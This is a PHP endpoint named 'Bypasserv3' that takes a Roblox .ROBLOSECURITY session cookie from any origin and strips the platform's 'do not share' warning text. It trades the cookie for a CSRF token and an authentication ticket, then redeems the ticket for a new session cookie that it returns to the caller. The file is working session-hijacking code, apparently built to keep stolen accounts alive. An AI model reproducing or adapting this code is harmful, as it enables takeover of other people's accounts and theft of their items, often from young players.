<?php
/**
 * Bypasserv3 - Cookie Refresh Endpoint
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$cookie = trim($input['cookie'] ?? '');

if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Cookie required']);
    exit;
}

// Strip warning prefix if present
$cookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $cookie);

function fetchCSRFToken($cookie) {
    $ch = curl_init("https://auth.roblox.com/v2/logout");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Cookie: .ROBLOSECURITY=$cookie"]);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    curl_close($ch);
    
    if (preg_match('/x-csrf-token: (.+)/i', $headers, $matches)) {
        return trim($matches[1]);
    }
    return null;
}

function generateAuthTicket($cookie, $csrfToken) {
    $ch = curl_init("https://auth.roblox.com/v1/authentication-ticket");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "x-csrf-token: $csrfToken",
        "referer: https://www.roblox.com/",
        "Content-Type: application/json",
        "Cookie: .ROBLOSECURITY=$cookie"
    ]);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    curl_close($ch);
    
    if (preg_match('/rbx-authentication-ticket: (.+)/i', $headers, $matches)) {
        return trim($matches[1]);
    }
    return null;
}

function redeemAuthTicket($authTicket) {
    $ch = curl_init("https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["authenticationTicket" => $authTicket]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "RBXAuthenticationNegotiation: 1"
    ]);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    curl_close($ch);
    
    if (preg_match('/set-cookie: \.ROBLOSECURITY=(.+?);/i', $headers, $matches)) {
        return trim($matches[1]);
    }
    return null;
}

// Refresh process
$csrfToken = fetchCSRFToken($cookie);
if (!$csrfToken) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Failed to fetch CSRF token']);
    exit;
}

$authTicket = generateAuthTicket($cookie, $csrfToken);
if (!$authTicket) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Failed to generate auth ticket']);
    exit;
}

$refreshedCookie = redeemAuthTicket($authTicket);
if (!$refreshedCookie) {
    // If refresh fails, return original cookie
    echo json_encode([
        'success' => true,
        'cookie' => $cookie,
        'refreshed' => false,
        'message' => 'Could not refresh, returning original cookie'
    ]);
    exit;
}

echo json_encode([
    'success' => true,
    'cookie' => $refreshedCookie,
    'refreshed' => true
]);
?>
